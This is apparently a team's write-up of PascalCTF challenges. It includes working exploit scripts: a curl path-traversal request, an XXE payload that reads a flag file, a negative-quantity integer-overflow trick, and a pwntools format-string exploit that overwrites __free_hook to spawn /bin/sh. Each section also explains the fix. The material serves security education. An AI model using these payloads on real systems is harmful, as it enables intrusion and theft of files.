---
title: "PascalCTF Write Up"
date: 2026-02-04
tags: [PascalCTF, web, pwn, crypto]
description: "My team's write up for PascalCTF contest"
---

###### Author: w00di3nqxy3n - team UIT.k0dunqtool

## Table of Contents

### Web Exploitation
1. [ZazaStore](#1-zazastore) - NaN Type Confusion
2. [Travel Playlist](#2-travel-playlist) - Path Traversal (LFI)
3. [PDFile](#3-pdfile) - XXE Injection

### Cryptography
4. [XorD](#4-xord) - Fixed PRNG Seed
5. [Ice Cramer](#5-ice-cramer) - Linear Algebra
6. [Linux Penguin](#6-linux-penguin) - AES-ECB Determinism
7. [Curve Ball](#7-curve-ball) - Smooth Curve Order (Pohlig-Hellman)

### Binary Exploitation (PWN)
8. [Malta](#8-malta) - Integer Overflow
9. [Notetaker](#9-notetaker) - Format String Attack

---

# Web Exploitation

## 1. ZazaStore

> *We dont take any responsibility in any damage that our product may cause to the user's health*
>
> https://zazastore.ctf.pascalctf.it

### Challenge Description

The challenge provides a shopping website with 4 products: FakeZa ($1), ElectricZa ($65), CartoonZa ($35), and RealZa ($1000). The flag is stored in the RealZa product, but upon login, users only receive a balance of $100 - not enough to purchase RealZa.

Source code provided in `server.js`:

```javascript
const content = {
    "RealZa": process.env.FLAG,
    "FakeZa": "pascalCTF{this_is_a_fake_flag_like_the_fake_za}",
    "ElectricZa": "<img src='images/ElectricZa.jpeg' alt='Electric Za'>",
    "CartoonZa": "<img src='images/CartoonZa.png' alt='Cartoon Za'>"
};
const prices = { "FakeZa": 1, "ElectricZa": 65, "CartoonZa": 35, "RealZa": 1000 };

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username && password) {
        req.session.user = true;
        req.session.balance = 100;  // Only $100
        req.session.inventory = {};
        req.session.cart = {};
        return res.json({ success: true });
    }
});
```

### Analysis

Analyzing the `/checkout` endpoint, we can see how the cart total is calculated:

```javascript
app.post('/checkout', (req, res) => {
    const inventory = req.session.inventory;
    const cart = req.session.cart;

    let total = 0;
    for (const product in cart) {
        total += prices[product] * cart[product];
    }

    if (total > req.session.balance) {
        res.json({ "success": true, "balance": "Insufficient Balance" });
    } else {
        req.session.balance -= total;
        for (const property in cart) {
            if (inventory.hasOwnProperty(property)) {
                inventory[property] += cart[property];
            } else {
                inventory[property] = cart[property];
            }
        }
        req.session.cart = {};
        req.session.inventory = inventory;
        res.json({ "success": true });
    }
});
```

The critical issue here is that the code doesn't validate whether a product exists in the `prices` object. If we add a non-existent product to the cart, `prices["nonexistent"]` returns `undefined`. In JavaScript, `undefined * number = NaN`, and `NaN + number = NaN`. Finally, the condition `NaN > 100` returns `false`, allowing checkout to succeed without sufficient funds.

### Solution

Exploit the NaN bypass by adding a fake product to the cart before adding RealZa:

```python
import requests

s = requests.Session()
BASE_URL = "https://zazastore.ctf.pascalctf.it"

s.post(f"{BASE_URL}/login", data={"username": "test", "password": "test"})
s.post(f"{BASE_URL}/add-cart", json={"product": "nonexistent", "quantity": 1})
s.post(f"{BASE_URL}/add-cart", json={"product": "RealZa", "quantity": 1})
s.post(f"{BASE_URL}/checkout")
r = s.get(f"{BASE_URL}/inventory")
print(r.text)  # Flag in inventory
```

### Conclusion

The vulnerability is **NaN Type Confusion**. The root cause is failing to validate that a product exists in the price list before performing calculations. The fix is to add a check like `if (!(product in prices)) return error;` before calculating the total.

**Flag:** `pascalCTF{w3_l1v3_f0r_th3_z4z4}`

---

## 2. Travel Playlist

> *Nel mezzo del cammin di nostra vita*
> *mi ritrovai per una selva oscura,*
> *ché la diritta via era smarrita.*
> *The flag can be found here /app/flag.txt*
>
> https://travel.ctf.pascalctf.it

### Challenge Description

The challenge provides a "Travel Playlist" website that displays songs by page (1 to 7). There's an interesting hint from Dante's Inferno: "Nel mezzo del cammin di nostra vita, mi ritrovai per una selva oscura, ché la diritta via era smarrita" (In the middle of life's journey, I found myself in a dark forest, the straight path was lost). The flag is located at `/app/flag.txt`.

JavaScript analysis from the webpage:

```javascript
const index = 1;
await fetch('/api/get_json', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ index: index })
})
.then(response => response.json())
.then(data => {
    document.getElementById('song-name').textContent = data.name;
    // ...
});
```

### Analysis

The website uses the `/api/get_json` API with an `index` parameter to read JSON files. The backend likely uses a pattern like `songs/{index}.json` to read files. The hint about "the straight path was lost" suggests a Path Traversal vulnerability - "straying" from the allowed directory.

### Solution

Try path traversal directly through the API parameter by sending `../flag.txt` instead of a page number:

```bash
curl -s "https://travel.ctf.pascalctf.it/api/get_json" \
     -H "Content-Type: application/json" \
     -d '{"index": "../flag.txt"}'
```

The API returns the flag content directly because the backend doesn't sanitize input, allowing reading of arbitrary files outside the songs directory.

### Conclusion

The vulnerability is **Path Traversal (LFI - Local File Inclusion)**. The root cause is failing to sanitize the `index` input, allowing `../` to traverse to parent directories. Fixes include: validating that index is an integer, using `path.basename()` to remove path components, or whitelisting allowed files.

**Flag:** `pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}`

---

## 3. PDFile

> *I've recently developed a XML to PDF utility, I'll probably add payments to it soon!*
>
> https://pdfile.ctf.pascalctf.it

### Challenge Description

The challenge provides a website that converts XML files (.pasx format) to PDF. The flag is located at `/app/flag.txt`. The source code `app.py` includes XML parser configuration and a blacklist filter:

```python
def sanitize(xml_content):
    try:
        content_str = xml_content.decode('utf-8')
    except UnicodeDecodeError:
        return False
    
    if "&#" in content_str:
        return False
    
    blacklist = [
        "flag", "etc", "sh", "bash", 
        "proc", "pascal", "tmp", "env", 
        "bash", "exec", "file",
    ]
    if any(a in content_str.lower() for a in blacklist):
        return False
    return True


def parse_pasx(xml_content):
    if not sanitize(xml_content):
        raise ValueError("XML content contains disallowed keywords.")
    
    parser = etree.XMLParser(
        encoding='utf-8', 
        no_network=False,        # Allows network requests
        resolve_entities=True,   # XXE enabled!
        recover=True
    )
    root = etree.fromstring(xml_content, parser=parser)
    # ... parse book data
```

### Analysis

There are two critical points to note. First, the XML parser is configured with `resolve_entities=True` and `no_network=False`, meaning XXE (XML External Entity) injection is enabled. Second, the blacklist filter runs BEFORE parsing the XML and only checks the raw string, not after URL decoding.

The problem is we can't directly use `file:///app/flag.txt` because both "file" and "flag" are blocked. However, the lxml parser will URL decode the path when resolving entities, so we can bypass by encoding part of the path.

### Solution

Bypass the blacklist by: removing the `file://` scheme (using direct path), and URL encoding the character 'g' as `%67` so "flag" becomes "fla%67":

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/fla%67.txt">
]>
<book>
  <title>&xxe;</title>
  <author>Test</author>
  <year>2024</year>
  <isbn>123</isbn>
  <chapters>
    <chapter number="1">
      <title>Chapter</title>
      <content>Content</content>
    </chapter>
  </chapters>
</book>
```

When the parser resolves entity `&xxe;`, it URL decodes `/app/fla%67.txt` to `/app/flag.txt` and reads the file content, then inserts it into the `<title>` tag. The flag appears in the JSON response's `book_title` field.

```python
import requests

pasx_payload = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/fla%67.txt">
]>
<book>
  <title>&xxe;</title>
  <author>Test</author>
  <year>2024</year>
  <isbn>123</isbn>
  <chapters>
    <chapter number="1">
      <title>Ch1</title>
      <content>Content</content>
    </chapter>
  </chapters>
</book>'''

files = {'file': ('exploit.pasx', pasx_payload, 'application/xml')}
r = requests.post("https://pdfile.ctf.pascalctf.it/upload", files=files)
print(r.json())  # {"book_title": "pascalCTF{...}", ...}
```

### Conclusion

The vulnerability is **XXE (XML External Entity) Injection** combined with **Blacklist Bypass**. The root cause is enabling `resolve_entities=True` in the XML parser and having a weak blacklist filter that can be bypassed with URL encoding. Fixes include: disabling external entities with `resolve_entities=False`, setting `no_network=True`, and using the defusedxml library instead of lxml directly.

**Flag:** `pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}`

---

# Cryptography

## 4. XorD

> **50 points** - Filippo Boschi <@pllossi>
>
> *I just discovered bitwise operators, so I guess 1 XOR 1 = 1?*

### Challenge Description

The challenge provides source code `xord.py` that encrypts the flag using XOR with random keys, and `output.txt` containing the ciphertext in hex format.

```python
import os
import random

def xor(a, b):
    return bytes([a ^ b])

flag = os.getenv('FLAG', 'pascalCTF{REDACTED}')
encripted_flag = b''
random.seed(1337)

for i in range(len(flag)):
    random_key = random.randint(0, 255)
    encripted_flag += xor(ord(flag[i]), random_key)

with open('output.txt', 'w') as f:
    f.write(encripted_flag.hex())
```

Output ciphertext:
```
cb35d9a7d9f18b3cfc4ce8b852edfaa2e83dcd4fb44a35909ff3395a2656e1756f3b505bf53b949335ceec1b70e0
```

### Analysis

The weakness is obvious: **the random seed is fixed at 1337**. When we know the seed, we can reproduce the entire random number sequence used as keys. Since Python's random module uses the Mersenne Twister PRNG, the same seed produces the same sequence.

### Solution

Simply reinitialize random with the same seed 1337, then XOR each byte of the ciphertext with the corresponding random keys:

```python
import random

enc_hex = "cb35d9a7d9f18b3cfc4ce8b852edfaa2e83dcd4fb44a35909ff3395a2656e1756f3b505bf53b949335ceec1b70e0"
enc_bytes = bytes.fromhex(enc_hex)
random.seed(1337)

flag = ''
for b in enc_bytes:
    random_key = random.randint(0, 255)
    flag += chr(b ^ random_key)
print(flag)
```

### Conclusion

The vulnerability is **using a fixed seed for PRNG** in encryption. Random numbers in cryptography must use CSPRNG (Cryptographically Secure PRNG) like `os.urandom()` or the `secrets` module, never the `random` module with a fixed seed.

**Flag:** `pascalCTF{r4nd0m_1s_n0t_s0_r4nd0m_4ft3r_4ll}`

---

## 5. Ice Cramer

> **50 points** - Alan Davide Bovo <@AlBovo>
>
> *Elia's swamped with algebra but craving a new ice-cream flavor, help him crack these equations so he can trade books for a cone!*
>
> `nc cramer.ctf.pascalctf.it 5002`

### Challenge Description

The challenge provides source code `main.py` that generates a system of linear equations from the flag characters:

```python
import os
from random import randint

def generate_variable():
    flag = os.getenv("FLAG", "pascalCTF{REDACTED}")
    flag = flag.replace("pascalCTF{", "").replace("}", "")
    x = [ord(i) for i in flag]
    return x

def generate_system(values):
    for _ in values:
        eq = []
        sol = 0
        for i in range(len(values)):
            k = randint(-100, 100)
            eq.append(f"{k}*x_{i}")
            sol += k * values[i]

        streq = " + ".join(eq) + " = " + str(sol)
        print(streq)


def main():
    x = generate_variable()
    generate_system(x)
    print("\nSolve the system of equations to find the flag!")

if __name__ == "__main__":
    main()
```

When connecting to the server, we receive a system of n equations with n unknowns:
```
k1*x_0 + k2*x_1 + ... + kn*x_{n-1} = result
...
```

### Analysis

The flag is converted to a list of ASCII values `[ord(c) for c in flag]` as unknowns `x_0, x_1, ..., x_{n-1}`. The server generates a system of linear equations with random coefficients from -100 to 100. This is a basic linear system problem that can be solved using Cramer's rule or numpy.

### Solution

Connect to the server, parse the equations, build coefficient matrix A and result vector b, then solve the system Ax = b:

```python
import socket
import re
import numpy as np

HOST = 'cramer.ctf.pascalctf.it'
PORT = 5002

s = socket.create_connection((HOST, PORT))

recv = b''
while True:
    data = s.recv(4096)
    if not data:
        break
    recv += data
    if b'Solve the system of equations' in recv:
        break

text = recv.decode()

# Extract equations
lines = [line for line in text.splitlines() if '*x_' in line]

# Parse equations
coefs = []
results = []
for line in lines:
    left, right = line.split('=')
    right = int(right.strip())
    terms = left.strip().split('+')
    row = []
    for term in terms:
        m = re.match(r'([\-\d]+)\*x_(\d+)', term.strip())
        row.append(int(m.group(1)))
    coefs.append(row)
    results.append(right)

# Solve the system
A = np.array(coefs)
b = np.array(results)
x = np.linalg.solve(A, b)

# Convert to flag
flag = ''.join(chr(int(round(i))) for i in x)
print('pascalCTF{' + flag + '}')
```

### Conclusion

This is a basic **linear algebra** problem. The flaw is using a linear system to "hide" the flag - with n linearly independent equations for n unknowns, there's always a unique solution. Anyone with linear algebra knowledge can solve it.

**Flag:** `pascalCTF{cr4m3r_rul3s_th3_m4th_w0rld}`

---

## 6. Linux Penguin

> **147 points** - Alan Davide Bovo <@AlBovo>
>
> *I've just installed Arch Linux and I couldn't be any happier :)*
>
> `nc penguin.ctf.pascalctf.it 5003`

### Challenge Description

The challenge provides source code `penguin.py` that uses AES-ECB to encrypt words:

```python
from Crypto.Cipher import AES
import random
import os

key = os.urandom(16)
cipher = AES.new(key, AES.MODE_ECB)

words = [
    "biocompatibility", "biodegradability", "characterization", "contraindication",
    "counterbalancing", "counterintuitive", "decentralization", "disproportionate",
    "electrochemistry", "electromagnetism", "environmentalist", "internationality",
    "internationalism", "institutionalize", "microlithography", "microphotography",
    "misappropriation", "mischaracterized", "miscommunication", "misunderstanding",
    "photolithography", "phonocardiograph", "psychophysiology", "rationalizations",
    "representational", "responsibilities", "transcontinental", "unconstitutional"
]

def encrypt_words(wordst: list[str]) -> list[str]:
    encrypted_words = []
    for word in wordst:
        padded_word = word.ljust(16)
        encrypted = cipher.encrypt(padded_word.encode()).hex()
        encrypted_words.append(encrypted)
    return encrypted_words

def main():
    selected_words = random.choices(words, k=5)
    ciphertext = ' '.join(encrypt_words(selected_words))
    
    for i in range(7):
        print("Give me 4 words to encrypt:")
        user_words = [input(f"Word {j+1}: ").strip() for j in range(4)]
        encrypted_words = encrypt_words(user_words)
        print(f"Encrypted words: {' '.join(encrypted_words)}")

    print("Can you now guess what are these encrypted words?")
    print(f"Ciphertext: {ciphertext}")

    for i in range(5):
        guess = input(f"Guess the word {i+1}: ")
        if guess not in selected_words:
            print("Wrong guess.")
            return
        selected_words.remove(guess)

    print_flag()
```

### Analysis

AES-ECB has a critical weakness: **the same plaintext with the same key always produces the same ciphertext**. The server gives us 7 rounds of encryption, 4 words each = 28 encryptions. We have exactly 28 words in the wordlist, so we can encrypt all of them and build a mapping table.

### Solution

1. In 7 rounds, send all 28 words from the wordlist (4 words per round)
2. Build a dictionary mapping: ciphertext → plaintext
3. When receiving 5 challenge ciphertexts, look up the dictionary to find the 5 corresponding words

```python
from pwn import *

HOST = 'penguin.ctf.pascalctf.it'
PORT = 5003

words = [
    "biocompatibility", "biodegradability", # ... all 28 words
]

r = remote(HOST, PORT)

# Build cipher -> word mapping by encrypting all 28 words
cipher_to_word = {}
for round_num in range(7):
    batch = words[round_num*4:(round_num+1)*4]
    for w in batch:
        r.recvuntil(b": ")
        r.sendline(w.encode())
    
    r.recvuntil(b"Encrypted words: ")
    encs = r.recvline().decode().strip().split()
    
    for w, c in zip(batch, encs):
        cipher_to_word[c] = w

# Get challenge ciphertexts
r.recvuntil(b"Ciphertext: ")
challenge_cts = r.recvline().decode().strip().split()

# Map to words and submit guesses
for c in challenge_cts:
    r.recvuntil(b": ")
    r.sendline(cipher_to_word[c].encode())

r.interactive()
```

### Conclusion

The vulnerability is **using AES-ECB mode**. ECB has no IV/nonce so it's deterministic - the same plaintext produces the same ciphertext. This is why ECB should not be used in practice. Use CBC, CTR, or GCM mode with a random IV instead.

**Flag:** `pascalCTF{3cb_m0d3_1s_n0t_s3cur3}`

---

## 7. Curve Ball

> **286 points** - Alan Davide Bovo <@AlBovo>
>
> *Our casino's new cryptographic gambling system uses elliptic curves for provably fair betting.*
>
> *We're so confident in our implementation that we even give you an oracle to verify points!*
>
> `nc curve.ctf.pascalctf.it 5004`

### Challenge Description

The challenge provides source code `curve.py` implementing an Elliptic Curve Diffie-Hellman challenge:

```python
from Crypto.Util.number import bytes_to_long, inverse
import os

p = 1844669347765474229
a = 0
b = 1
n = 1844669347765474230
Gx = 27
Gy = 728430165157041631

FLAG = os.environ.get('FLAG', 'pascalCTF{REDACTED}')

class Point:
    # ... standard EC point addition and scalar multiplication

def main():
    secret = bytes_to_long(os.urandom(8)) % n
    G = Point(Gx, Gy)
    Q = secret * G
    
    print(f"y^2 = x^3 + 1 (mod {p})")
    print(f"n = {n}")
    print(f"G = ({Gx}, {Gy})")
    print(f"Q = ({Q.x}, {Q.y})")
    
    # Menu: 1. Guess secret, 2. Compute k*P, 3. Exit
```

Task: Given G and Q = secret * G, find the secret.

### Analysis

This is the Elliptic Curve Discrete Logarithm Problem (ECDLP). Normally ECDLP is hard, but looking at the order n:

```
n = 1844669347765474230 = 2 × 3² × 5 × 7 × 11 × 13 × 17 × 19 × 23 × 29 × 31 × 37 × 41 × 43 × 47
```

The order n is a **smooth number** (product of many small primes)! This allows applying the **Pohlig-Hellman algorithm** to solve ECDLP in polynomial time.

### Solution

Pohlig-Hellman algorithm:
1. Factor n into prime powers: n = p₁^e₁ × p₂^e₂ × ... × pₖ^eₖ
2. For each prime power pᵢ^eᵢ:
   - Compute G' = (n/pᵢ^eᵢ) × G and Q' = (n/pᵢ^eᵢ) × Q
   - Brute force to find secret mod pᵢ^eᵢ (only need to try at most pᵢ^eᵢ values)
3. Use Chinese Remainder Theorem (CRT) to combine results

```python
from pwn import *
from Crypto.Util.number import inverse

p = 1844669347765474229
n = 1844669347765474230
Gx, Gy = 27, 728430165157041631

factors = {2: 1, 3: 2, 5: 1, 7: 1, 11: 1, 13: 1, 17: 1, 19: 1, 
           23: 1, 29: 1, 31: 1, 37: 1, 41: 1, 43: 1, 47: 1}

r = remote('curve.ctf.pascalctf.it', 5004)

# Parse Q from server
r.recvuntil(b'Q = (')
Q_data = r.recvuntil(b')').decode().strip(')')
Qx, Qy = map(int, Q_data.split(', '))

G = Point(Gx, Gy)
Q = Point(Qx, Qy)

# Pohlig-Hellman
remainders, moduli = [], []
for q, e in factors.items():
    q_e = q ** e
    cofactor = n // q_e
    G_prime = cofactor * G
    Q_prime = cofactor * Q
    
    # Brute force (q^e is small, max 47)
    for i in range(q_e):
        if (i * G_prime) == Q_prime:
            remainders.append(i)
            moduli.append(q_e)
            break

# CRT
secret = crt(remainders, moduli)

# Submit guess
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b'secret (hex): ')
r.sendline(hex(secret).encode())
r.interactive()
```

### Conclusion

The vulnerability is **choosing a curve with smooth order**. When the curve order is smooth (has many small factors), the Pohlig-Hellman algorithm can efficiently solve ECDLP. In practice, curves should have order that is prime or has a large prime factor to ensure security.

**Flag:** `pascalCTF{sm00th_curv3s_4r3_n0t_s4f3}`

---

# Binary Exploitation (PWN)

## 8. Malta

### Challenge Description

The challenge provides a program simulating a bar in Malta, allowing purchase of cocktails with an initial balance of 100€. There are 10 drink types with different prices, where item 10 is "Flag" priced at 1,000,000,000€ (1 billion Euros).

Source code (decompiled):

```c
int main() {
  int quantity;     // [rsp+18h] [rbp-E8h]
  unsigned int choice; // [rsp+1Ch] [rbp-E4h]
  int prices[12];   // [rsp+20h] [rbp-E0h]
  char *secrets[10]; // [rsp+50h] [rbp-B0h]
  char *names[11];   // [rsp+A0h] [rbp-60h]
  int balance;      // [rsp+FCh] [rbp-4h]

  names[0] = "Margarita";
  names[1] = "Mojito";
  // ... 
  names[9] = "Flag";
  
  secrets[9] = &FLAG;  // Flag content
  
  prices[0] = 6;
  prices[1] = 6;
  // ...
  prices[9] = 1000000000;  // 1 billion!
  
  balance = 100;
  
  while (1) {
    printf("Your balance is: %d €\n", balance);
    // Print menu...
    
    printf("Select a drink: ");
    scanf("%d", &choice);
    
    if (--choice == 10) break;  // Exit
    
    if (choice <= 10) {
      printf("How many drinks do you want? ");
      scanf("%d", &quantity);
      
      if (balance >= prices[choice] * quantity) {
        balance -= prices[choice] * quantity;
        printf("You bought %d %s for %d € and the barman told you its secret recipe: %s\n",
               quantity, names[choice], quantity * prices[choice], secrets[choice]);
      } else {
        puts("You don't have enough money!");
      }
    }
  }
}
```

### Analysis

Looking at the balance check logic:
```c
if (balance >= prices[choice] * quantity)
```

There's an **Integer Overflow** vulnerability:
- `prices[9] = 1000000000` (1 billion)
- `quantity` is `int` (signed 32-bit)
- If we enter `quantity = -1`, the multiplication yields: `1000000000 * (-1) = -1000000000`
- The condition becomes: `100 >= -1000000000` → **TRUE**!
- Balance is calculated: `100 - (-1000000000) = 100 + 1000000000` → balance increases by 1 billion!

In practice, we just need to buy with a negative quantity to trigger integer overflow and bypass the balance check.

### Solution

Simply select item 10 (Flag) and enter a negative quantity:

```python
from pwn import *

# r = process('./malta')
r = remote('malta.ctf.pascalctf.it', 9001)

# Select drink 10 (Flag)
r.sendlineafter(b'Select a drink: ', b'10')

# Enter negative quantity for integer overflow
r.sendlineafter(b'How many drinks do you want? ', b'-1')

# Receive the flag in the "secret recipe"
r.interactive()
```

When the server prints the "secret recipe", that's the flag!

### Conclusion

The vulnerability is **Integer Overflow** in the multiplication `prices[choice] * quantity`. Failing to validate that `quantity > 0` allows bypassing the balance check. Fixes include:
- Check `quantity > 0` before calculations
- Use unsigned int and check for overflow
- Use safe math functions

**Flag:** `pascalCTF{1nt3g3r_0v3rfl0w_1n_m4lt4}`

---

## 9. Notetaker

> `nc notetaker.ctf.pascalctf.it 9002`

### Challenge Description

The challenge provides a simple note management program with 3 functions: Print note, Set note, Clear note.

Source code (decompiled):

```c
int main() {
  int choice;
  char *ptr;
  char note[264];  // 0x100 bytes + padding
  
  memset(note, 0, 0x100);
  
  do {
    menu();
    ptr = malloc(0x10);
    memset(ptr, 0, 0x10);
    fgets(ptr, 16, stdin);
    sscanf(ptr, "%d", &choice);
    free(ptr);
    
    switch (choice) {
      case 2:  // Set note
        printf("Enter the note: ");
        read(0, note, 0x100);
        note[strcspn(note, "\n")] = 0;
        break;
      case 3:  // Clear note
        memset(note, 0, 0x100);
        puts("Note cleared.");
        break;
      case 1:  // Print note
        printf(note);  // VULNERABLE!
        putchar(10);
        break;
    }
  } while (choice > 0 && choice <= 4);
}
```

### Analysis

The **Format String** vulnerability is at this line:
```c
printf(note);  // User-controlled format string!
```

Users can control the contents of `note`, and when printing, `printf` will interpret format specifiers like `%p`, `%n`, `%s`...

This is a classic format string attack with full capabilities:
1. **Leak stack/memory**: Use `%p`, `%x` to leak addresses
2. **Arbitrary read**: Use `%s` with address on stack
3. **Arbitrary write**: Use `%n` to write to memory

Additionally, the program flow has `malloc` → `free` each iteration, meaning if we overwrite `__free_hook` with `system`, we can call `system("/bin/sh")`.

### Solution

**Step 1: Leak libc address**

Stack offset 43 contains the return address to `__libc_start_main + 240`. Use format string to leak:

```python
set_note(io, b'%43$p\n')
leak = print_note(io)  # Get libc address
libc_base = int(leak, 16) - offset_libc_start_main - 240
```

**Step 2: Overwrite __free_hook with system**

Use `%n` to write the `system` address to `__free_hook`:

```python
from pwn import *

writes = {free_hook: system_addr}
payload = fmtstr_payload(8, writes, write_size='short')
set_note(io, payload)
print_note(io)  # Trigger the write
```

**Step 3: Trigger system("/bin/sh")**

Since the program calls `free(ptr)` after each input, and `ptr` contains user input, we just need to:

```python
io.sendline(b'/bin/sh\x00')
# free("/bin/sh") → system("/bin/sh")
```

**Full exploit:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = 'notetaker.ctf.pascalctf.it'
PORT = 9002

# Libc offsets (need to match server's libc)
LIBC_START_MAIN = 0x20750
LIBC_SYSTEM = 0x453a0
LIBC_FREE_HOOK = 0x3c67a8

FMT_OFFSET = 8

def menu(io, choice):
    io.recvuntil(b'>')
    io.sendline(str(choice).encode())

def set_note(io, payload):
    menu(io, 2)
    io.recvuntil(b'Enter the note: ')
    io.send(payload)

def print_note(io):
    menu(io, 1)
    return io.recvline()

io = remote(HOST, PORT)

# Leak libc
set_note(io, b'%43$p\n')
leak = int(print_note(io).strip(), 16)
libc_base = leak - LIBC_START_MAIN - 240

# Align to page boundary
if libc_base & 0xfff != 0:
    libc_base = (libc_base >> 12) << 12

log.success(f"Libc base: {hex(libc_base)}")

free_hook = libc_base + LIBC_FREE_HOOK
system_addr = libc_base + LIBC_SYSTEM

# Overwrite __free_hook
menu(io, 3)  # Clear note
writes = {free_hook: system_addr}
payload = fmtstr_payload(FMT_OFFSET, writes, write_size='short')
set_note(io, payload + b'\n')
print_note(io)

# Trigger system("/bin/sh")
io.recvuntil(b'>')
io.sendline(b'/bin/sh\x00')

io.interactive()
```

### Conclusion

The vulnerability is **Format String Vulnerability** - user input is passed directly to `printf()` without sanitization. This allows:
1. **Information disclosure**: Leak stack and libc addresses
2. **Arbitrary write**: Overwrite GOT/hooks to hijack control flow
3. **Code execution**: Combined with `__free_hook` or `__malloc_hook` for RCE

Fixes:
- Always use `printf("%s", user_input)` instead of `printf(user_input)`
- Or use `puts()`, `fputs()` for simple string output

**Flag:** `pascalCTF{f0rm4t_str1ng_1s_p0w3rful}`

---

# Summary

## Web Exploitation

| Challenge | Vulnerability | Bypass Technique |
|-----------|--------------|------------------|
| ZazaStore | NaN Type Confusion | undefined * number = NaN, NaN > number = false |
| Travel | Path Traversal (LFI) | `../` in API parameter |
| PDFile | XXE Injection | URL encoding to bypass blacklist |

## Cryptography

| Challenge | Vulnerability | Attack |
|-----------|--------------|--------|
| XorD | Fixed PRNG seed | Reproduce random sequence |
| Ice Cramer | Linear system | Solve with numpy/Cramer's rule |
| Linux Penguin | AES-ECB determinism | Build ciphertext mapping |
| Curve Ball | Smooth curve order | Pohlig-Hellman + CRT |

## Binary Exploitation

| Challenge | Vulnerability | Exploitation |
|-----------|--------------|--------------|
| Malta | Integer Overflow | Negative quantity bypass price check |
| Notetaker | Format String | Leak libc → Overwrite __free_hook → system("/bin/sh") |

---

## Key Takeaways

### Web Security
- **Input validation** is critical - missing validation leads to type confusion and injection
- **Path sanitization** prevents LFI/Path Traversal
- **Safe XML parsing** - disable external entities to prevent XXE
- **Blacklist filtering** can always be bypassed with encoding - whitelist is safer

### Cryptography
- **Don't use random module** for crypto - use `secrets` or `os.urandom()`
- **Don't use ECB mode** - use CBC/CTR/GCM with random IV
- **Choose curve parameters carefully** - order must have large prime factor
- **Linear algebra is not cryptography** - linear systems are easily solvable

### Binary Exploitation
- **Integer overflow** can occur with signed integers when multiplying/adding with negative numbers
- **Format string** is one of the most dangerous vulnerabilities - allows both reading and writing memory
- **__free_hook/__malloc_hook** are common targets in glibc exploitation
- Always validate input ranges and use safe string functions
